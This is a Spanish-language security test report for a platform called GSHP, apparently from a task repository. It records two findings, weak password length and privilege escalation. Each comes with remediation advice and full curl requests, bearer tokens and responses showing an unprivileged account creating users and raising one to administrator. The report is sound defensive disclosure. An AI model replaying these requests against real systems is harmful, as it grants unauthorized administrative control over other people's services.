# tareas
tareas para GSHP plataforma


ons
¡Que tal Kelly!

Aquí te envió el resultado de las pruebas de seguridad.


Vulnerabilidad: Longitud de contrasenias es muy corta.
Descripcion: El sitio permite establecer e iniciar sesion contrasenas de un solo caracter (incluso espacios en blanco).
Nivel de Riesgo: medio
Solucion: Establecer una politica de contrasenas que establezca la longitud minima a 8 caracteres con mayusculas, minusculas, caracteres especiales con una secuencia evitando caracteres consecutivos similares  (aaa, bbb, ccc), secuencias numericas
monotonas (123456789, 987654321) o palabras contenidad en un diccionario.

Actualizando la contrasenia

Peticion

curl -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InVucHJpdmlsZWdlZEBjb21wYW55LmNvbSIsImlhdCI6MTYwNjUxOTYwMn0.F8E1rwD3AoY851Y40a87n-xePuXu9WK2jNSnRS_hgps" -H "Origin: https://api-backend.gshp-apps.com:40010" -H "Referer: https://api-backend.gshp-apps.com:40010/" -H "Host: api-backend.gshp-apps.com:40000" -d '{"user":"unprivileged","email":"unprivileged@company.com","password":" ","roleId":2}' https://api-backend.gshp-apps.com:40000/user

Respuesta
{"user":"unprivileged","email":"unprivileged@company.com","password":" ","roleId":2,"statusId":1}


Iniciando Sesion

Peticion
curl -X POST -H "Content-Type: application/json" -H "Referer: https://api-backend.gshp-apps.com:40010/" -H "Origin: https://api-backend.gshp-apps.com:40010" -d '{"username":"unprivileged@company.com","password":" "}' https://api-backend.gshp-apps.com:40000/auth/login

Respuesta
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InVucHJpdmlsZWdlZEBjb21wYW55LmNvbSIsImlhdCI6MTYwNjUyNTAwM30.iHpqOqQwaigx9pSZuXyRlAhkXVrI0AYIhIUX5vlafNY","user":{"email":"unprivileged@company.com","user":"unprivileged","password":" ","roleId":2,"statusId":1}}


********************************************************************************************************
Vulnerabilidad: Escalacion de privilegios
Descripcion: el sitio permite a un usuario no privilegiado con un token de sesion (unprivileged@company.com), acceder y consumir todos los endpoints que estan destinados para un administrador.
Nivel de Riesgo: critico
Solucion: Es necesario que todas las funciones administrativas validen el rol del usuario antes de servir las peticiones.


Iniciando sesión

curl -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6Impvc3ltYXIudHJ1amlsbG9AZ28tc2hhcnAuY29tIiwiaWF0IjoxNjA2NTEyNzMzfQ.f37ppfIouIrOGZlChko811urriMBjD3jDxGBTDp9QwU" -H "Referer: https://api-backend.gshp-apps.com:40010/" -H "Origin: https://api-backend.gshp-apps.com:40010" -d '{"username":"unprivileged@company.com","password":"123456"}' https://api-backend.gshp-apps.com:40000/auth/login
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InVucHJpdmlsZWdlZEBjb21wYW55LmNvbSIsImlhdCI6MTYwNjUxOTYwMn0.F8E1rwD3AoY851Y40a87n-xePuXu9WK2jNSnRS_hgps","user":{"email":"unprivileged@company.com","user":"unprivileged","password":"123456","roleId":2,"statusId":1}}

Actualizando contraseña

Petición
curl -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InVucHJpdmlsZWdlZEBjb21wYW55LmNvbSIsImlhdCI6MTYwNjUxOTYwMn0.F8E1rwD3AoY851Y40a87n-xePuXu9WK2jNSnRS_hgps" -H "Origin: https://api-backend.gshp-apps.com:40010" -H "Referer: https://api-backend.gshp-apps.com:40010/" -H "Host: api-backend.gshp-apps.com:40000" -d '{"user":"unprivileged","email":"unprivileged@company.com","password":"987654321","roleId":2}' https://api-backend.gshp-apps.com:40000/user

Respuesta
{"user":"unprivileged","email":"unprivileged@company.com","password":"987654321","roleId":2,"statusId":1}j


Crear otros usuarios

curl -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InVucHJpdmlsZWdlZEBjb21wYW55LmNvbSIsImlhdCI6MTYwNjUxOTYwMn0.F8E1rwD3AoY851Y40a87n-xePuXu9WK2jNSnRS_hgps" -H "Origin: https://api-backend.gshp-apps.com:40010" -H "Referer: https://api-backend.gshp-apps.com:40010/" -H "Host: api-backend.gshp-apps.com:40000" -d '{"user":"hackedUser","email":"hackedUser@company.com","password":"hackedUser","roleId":2}' https://api-backend.gshp-apps.com:40000/user

{"user":"hackedUser","email":"hackedUser@company.com","password":"hackedUser","roleId":2,"statusId":1}


Cambiar role a usuario no privilegiado a usuario Administrador.

curl -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InVucHJpdmlsZWdlZEBjb21wYW55LmNvbSIsImlhdCI6MTYwNjUxOTYwMn0.F8E1rwD3AoY851Y40a87n-xePuXu9WK2jNSnRS_hgps" -H "Origin: https://api-backend.gshp-apps.com:40010" -H "Referer: https://api-backend.gshp-apps.com:40010/" -H "Host: api-backend.gshp-apps.com:40000" -d '{"user":"hackedUser","email":"hackedUser@company.com","password":"hackedUser","roleId":1}' https://api-backend.gshp-apps.com:40000/user


Rechazar Queries

Peticion
curl -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InVucHJpdmlsZWdlZEBjb21wYW55LmNvbSIsImlhdCI6MTYwNjUxOTYwMn0.F8E1rwD3AoY851Y40a87n-xePuXu9WK2jNSnRS_hgps" -H "Origin: https://api-backend.gshp-apps.com:40010" -H "Referer: https://api-backend.gshp-apps.com:40010/" -H "Host: api-backend.gshp-apps.com:40000" -d '{"id":1,"query":"select malo","comments":"Porfa","dbId":1,"userName":"josymar.trujillo@go-sharp.com","statusId":1,"rejectMssg":"El select tiene un error de sintaxis"}'  https://api-backend.gshp-apps.com:40000/query/reject-query

Respuesta
{"id":1,"query":"select malo","comments":"Porfa","dbId":1,"userName":"josymar.trujillo@go-sharp.com","statusId":3,"rejectMssg":"El select tiene un error de sintaxis"}


Aprobar queries

Peticion
curl -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InVucHJpdmlsZWdlZEBjb21wYW55LmNvbSIsImlhdCI6MTYwNjUxOTYwMn0.F8E1rwD3AoY851Y40a87n-xePuXu9WK2jNSnRS_hgps" -H "Origin: https://api-backend.gshp-apps.com:40010" -H "Referer: https://api-backend.gshp-apps.com:40010/" -H "Host: api-backend.gshp-apps.com:40000" -d '{"id":5,"query":"Error en conexion de la base","comments":"error prueba","dbId":3,"userName":"josymar.trujillo@go-sharp.com","statusId":1,"rejectMssg":""}'  https://api-backend.gshp-apps.com:40000/query/approve-query

Respuesta
{"error": true,"typeError":"CONN_ERROR"}


También es importante que el sitio cierre la sesión después de cierto tiempo de inactividad e invalide los tokens de sesión.


Cualquier duda o comentario, me lo pueden hacer llegar por este medio.

¡¡Saludos!!
